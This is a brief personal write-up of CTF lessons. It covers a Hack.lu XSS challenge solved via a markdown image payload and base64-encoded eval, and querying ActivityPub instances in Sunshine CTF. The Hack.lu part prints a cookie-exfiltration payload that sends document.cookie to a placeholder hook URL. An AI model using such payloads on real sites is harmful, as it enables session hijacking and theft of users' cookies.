Learnt thing from Hacklu:
There was only one problem solved by us in Hacklu ctf. COuld not find any more writeups for it currently. THe solved question was a XSS cookie exfiltration challenge 
in which the payload followe this kind of structure: xss input > markdown parser > custom url replace function > innerhtml.
First need an XSS payload for markdown, next need to bypass the url replae funtion which replaces any url in the payload with their local url, preventing exfiltration.

The final payload for CSS POC was: **![catshttps://onerror=alert(1)//]()
From what I understand this is just the normal XSS payload <img src=x onerror=alert(1)> in markdown form because markdown uses this syntax to load images: ![alt text](image url)

Once we get a succesful alert using this we can exfiltrate the cookie and to bypass the url replace fundtion we use base64 encoding instead of directly putting the payload:
`**![catshttps://onerror=eval(atob('d2l=='))//]()` where d2l is jsut placeholder for base64 encoded paylad of the form: window.open(`{HOOK_URL}?x=${btoa(document.cookie)}`);



The more interesting thing learnt was from Sunshine CTF where we had to interact with accounts on fedi instances which used ActivityPub,a decentralized social networking protocol.
We had to read the docs and figure out how to interact with users on a particular instances set up for the CTF. The main thing was using a particular Accept header when sending the request: `'Accept': 'application/activity+json'`.

Also after the ctf got over got to know about https://browser.pub/ which is a directoy of fedi instances and could have helped us get the flag directly because it was just in the profile page of the user directly.